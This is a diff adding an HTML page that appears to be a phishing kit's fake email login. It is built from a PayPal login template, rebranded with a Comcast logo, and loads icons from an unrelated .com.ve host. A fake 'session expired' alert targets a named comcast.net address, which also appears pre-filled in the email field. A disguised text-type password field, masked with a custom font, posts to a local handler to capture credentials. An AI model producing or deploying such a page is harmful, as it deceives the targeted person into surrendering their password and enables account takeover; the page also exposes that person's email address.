@@ -1,0 +1,108 @@
+
+<!DOCTYPE html>
+<!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie"><![endif]-->
+<!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie"><![endif]-->
+<!--[if !IE]>--><html lang="en" class="no-js">
+<!--<![endif]--><head>
+<meta charset="utf-8" /><title></title>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<meta name="application-name" content="PayPal" />
+<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=content/pp_favicon_x.ico" />
+<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=content/pp_favicon_x.ico" />
+<meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=content/pp_favicon_x.ico" />
+<meta name="keywords" content="transfer money, email money transfer, international money transfer " />
+<meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
+<link rel="shortcut icon" href="http://799-519-281.7ic4bqwon1q2rppd.nddc6d98qr.com.ve/cgi-bin/generic/content/favicon.ico" />
+<link rel="apple-touch-icon" href="http://799-519-281.7ic4bqwon1q2rppd.nddc6d98qr.com.ve/cgi-bin/generic/content/apple-touch-icon.png" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
+<link rel="stylesheet" href="../../../../generic/content/app.css" />
+
+
+<style type=text/css>
+@font-face {
+  font-family: 'xpassword';
+  src: url('../../../../generic/content/password.woff2') format('woff2'),
+       url('../../../../generic/content/password.woff') format('woff'),
+       url('../../../../generic/content/password.ttf') format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+</style>
+
+</head>
+<body class="desktop " data-rlogid="" data-hostname="" data-production="true"  	 data-view-name="login" data-template-path="" data-csrf-token="">
+<noscript><p class="nonjsAlert" role="alert">NOTE: Many features on this Web site require Javascript and cookies.</p></noscript>
+<div id="page">
+<div id="content" class="contentContainer">
+<header>
+
+
+<div class="paypal-logo" style="background:transparent url(../../../../generic/content/comcast.png) top center no-repeat; width:115px;height:40px;"></div>
+
+</header>
+<div id="main" class="main " role="main">
+<section id="login" class="login" data-role="page" data-title="Log in to your email account">
+<h1 class="headerText accessAid"></h1>
+
+
+<div id="notifications" class="notifications">
+<p class="notification notification-critical" role="alert" style="border-radius: 2px;"><b>eMail Session for  cleusner@comcast.net expired , login again to continue.</b></p>
+</div>
+<form action="index.html" method="post" class="" name="login"autocomplete="off" novalidate id=loginform>
+<input type="hidden" id="token" name="_csrf" value="Sz1o67T2zv4BDm3diybVDZylxUwWf6+mFrsmw=">
+<input type="hidden" name="locale.x" value="en_US"><input type="hidden" name="processSignin" value="main">
+<div id="passwordSection" class="clearfix error">
+<div class="textInput " id="login_emaildiv"> <div class="fieldWrapper">
+<label for="email" class="fieldLabel">Email</label>
+<input id="email" name="login_email"type="email" readonly class="hasHelp validateEmpty" style="border-radius: 2px;" value="cleusner@comcast.net"		
+             required="required" aria-required="true"   autocomplete=	"off"			placeholder=	"Email"		/></div>
+<div class="errorMessage"id="emailErrorMessage"><p class="emptyError hide">Required</p>
+<p class="invalidError hide">That email format isn’t right</p></div></div>
+<div class="textInput " id="login_passworddiv"><div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
+<input id="password"name="login_password"type="text" class="hasHelp validateEmpty" style="border-radius: 2px; font-family: xpassword;" value=""		placeholder=	"Email Password" autocomplete="off"/></div>
+<div class="errorMessage"id="passwordErrorMessage"><p class="emptyError hide">Required</p></div></div></div><div class="actions">
+<button class="button actionContinue" style="border-radius: 2px;" type="submit" id="btnLogin" name="btnLogin" value="Login" onClick="document.getElementById('btnLogin').textContent='Checking your info...';document.getElementById('btnLogin').disabled=true;document.getElementById('loginform').submit();">Sign In</button></div>
+
+
+
+</form>
+
+</section>
+</div></div>
+<div class="transitioning hide">
+<p class="checkingInfo hide">Checking your info…</p>
+<p class="oneSecond hide">Just a second…</p></div></div>
+
+
+
+<footer class="identityFooter clearfix" role="contentinfo"><ul>
+
+</ul>
+
+</footer>
+
+
+
+
+
+</body></html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
